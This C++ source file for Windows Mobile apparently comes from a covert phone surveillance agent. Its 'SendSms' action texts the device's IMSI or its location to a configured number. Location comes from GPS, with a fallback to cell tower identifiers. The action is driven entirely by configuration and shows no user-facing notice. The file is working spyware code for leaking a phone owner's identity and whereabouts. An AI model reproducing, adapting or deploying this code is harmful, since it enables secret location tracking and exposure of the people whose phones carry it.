#include "SendSms.h"
#include "Device.h"
#include "SmsMessage.h"
#include <gpsapi.h>
#include "Gps.h"
#include "Cell.h"

SendSms::SendSms(Configuration *c) : stopAction(FALSE) {
	conf = c;
}

INT SendSms::run() {
	wstring number, text;
	Device *deviceObj = Device::self();
	BOOL position, sim;

	auto_ptr<Sms> sms(new(std::nothrow) Sms());

	if (sms.get() == NULL)
		return 0;

	if (deviceObj->IsGsmEnabled() == FALSE)
		return 0;

	try {
		number = conf->getString(L"number");
	} catch (...) {
		DBG_TRACE(L"Debug - SendSms.cpp - No number set\n", 1, FALSE);
		return 0;
	}

	try {
		position = conf->getBool(L"position");
	} catch (...) {
		position = FALSE;
	}

	try {
		sim = conf->getBool(L"sim");
	} catch (...) {
		sim = FALSE;
	}

	try {
		text = conf->getString(L"text");
	} catch (...) {
		text = L"";
	}

	if (sim) {
		wstring text;
		BOOL bRes;

		if (deviceObj->GetImsi().empty()) {
			return 0;
		}

		text = L"IMSI: ";
		text += deviceObj->GetImsi();
		
		bRes = sms->SendMessage((const LPWSTR)number.c_str(), (const LPWSTR)text.c_str());
		return bRes;
	} 

	if (position) {
		HANDLE smsThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SmsThread, (void*)conf, 0, NULL);

		if (smsThread == NULL) {
			CloseHandle(smsThread);
			return 0;
		}

		return 1;
	}

	if (text.empty() == FALSE) {
		wstring text;
		BOOL bRes;

		try {
			text = conf->getString(L"text");
		} catch (...) {
			DBG_TRACE(L"Debug - SendSms.cpp - No text provided\n", 1, FALSE);
			return 0;
		}

		text.resize(70);
		bRes = sms->SendMessage((const LPWSTR)number.c_str(), (const LPWSTR)text.c_str());

		return bRes;
	}

	DBG_TRACE(L"Debug - SendSms.cpp - *** We shouldn't be here!!!\n", 1, FALSE);
	return FALSE;
}

BOOL SendSms::getStop() {
	return stopAction;
}

DWORD WINAPI SmsThread(LPVOID lpParam) {
#define GPS_TIMEOUT		360 // 360 secondi
#define GPS_TIMESLICE	10  // In step di 10 secondi

#define CELL_TIMEOUT	30  // 30 secondi
#define CELL_TIMESLICE	10  // In step di 10 secondi

	wstring number;
	Device *deviceObj = Device::self();
	Configuration *conf = (Configuration *)lpParam;

	auto_ptr<Sms> sms(new(std::nothrow) Sms());

	GPS *gpsObj = GPS::self(30000, 1000);
	Cell *cellObj = Cell::self(30000);

	GPS_POSITION position;
	RILCELLTOWERINFO cell;

	DWORD dwGpsFields, dwCellFields;
	DWORD dwMCC, dwMNC;
	WCHAR wTmp[71]; // Codifica a 7 bit per 160 caratteri
	wstring text;
	BOOL bGpsAcquired;
	UINT i;

	try {
		number = conf->getString(L"number");
	} catch (...) {
		DBG_TRACE(L"Debug - SendSms.cpp - SmsThread - No number set\n", 1, FALSE);
		return 0;
	}

	ZeroMemory(&position, sizeof(position));
	ZeroMemory(&cell, sizeof(cell));
	ZeroMemory(&wTmp, sizeof(wTmp));

	if (gpsObj == NULL)
		return 0;

	dwGpsFields = GPS_VALID_LATITUDE | GPS_VALID_LONGITUDE;
	bGpsAcquired = FALSE;

	do {
		if (gpsObj->Start() == FALSE)
			break;

		if (gpsObj->getGPS(&position) && (position.dwValidFields & dwGpsFields) == dwGpsFields &&
			position.FixType == GPS_FIX_3D) {

				bGpsAcquired = TRUE;
				_snwprintf(wTmp, 70, L"GPS lat: %f lon: %f\n", position.dblLatitude, position.dblLongitude);
				gpsObj->Stop();

				break;
		} 

		// Polliamo se non riusciamo subito ad avere una posizione
		for (i = 0; i < GPS_TIMEOUT / GPS_TIMESLICE; i++) {
			Sleep(GPS_TIMESLICE * 1000);

			if (gpsObj->getGPS(&position) && (position.dwValidFields & dwGpsFields) == dwGpsFields &&
				position.FixType == GPS_FIX_3D) {

					bGpsAcquired = TRUE;
					_snwprintf(wTmp, 70, L"GPS lat: %f lon: %f\n", position.dblLatitude, position.dblLongitude);
					gpsObj->Stop();
					break;
			}
		}

		gpsObj->Stop();
	} while(0);

	Sleep(2000);

	// Se non abbiamo il GPS, proviamo con la cella
	do {
		dwCellFields =  RIL_PARAM_CTI_LOCATIONAREACODE | RIL_PARAM_CTI_CELLID;

		dwMCC = deviceObj->GetMobileCountryCode();
		dwMNC = deviceObj->GetMobileNetworkCode();

		if (bGpsAcquired)
			break;

		if (cellObj->Start() == FALSE)
			break;

		if (cellObj->getCELL(&cell) && (cell.dwParams & dwCellFields) == dwCellFields) { // Se abbiamo una cella valida
			if (cell.dwMobileCountryCode == 0)
				cell.dwMobileCountryCode = dwMCC;

			if (cell.dwMobileNetworkCode == 0)
				cell.dwMobileNetworkCode = dwMNC;

			_snwprintf(wTmp, 70, L"CC: %d, MNC: %d, LAC: %d, CID: %d\n", cell.dwMobileCountryCode, 
				cell.dwMobileNetworkCode, cell.dwLocationAreaCode, cell.dwCellID);

			cellObj->Stop();
			break;
		} 

		for (i = 0; i < CELL_TIMEOUT / CELL_TIMESLICE; i++) {
			Sleep(CELL_TIMESLICE * 1000);

			if (cellObj->getCELL(&cell) && (cell.dwParams & dwCellFields) == dwCellFields) {
				if (cell.dwMobileCountryCode == 0)
					cell.dwMobileCountryCode = dwMCC;

				if (cell.dwMobileNetworkCode == 0)
					cell.dwMobileNetworkCode = dwMNC;

				_snwprintf(wTmp, 70, L"CC: %d, MNC: %d, LAC: %d, CID: %d\n", cell.dwMobileCountryCode, 
					cell.dwMobileNetworkCode, cell.dwLocationAreaCode, cell.dwCellID);

				cellObj->Stop();
				break;
			}
		}

		cellObj->Stop();
	} while(0);

	text = wTmp;

	if (text.empty()) {
		text = L"Position not found";
	}

	BOOL bRes = sms->SendMessage((const LPWSTR)number.c_str(), (const LPWSTR)text.c_str());

	return bRes;
}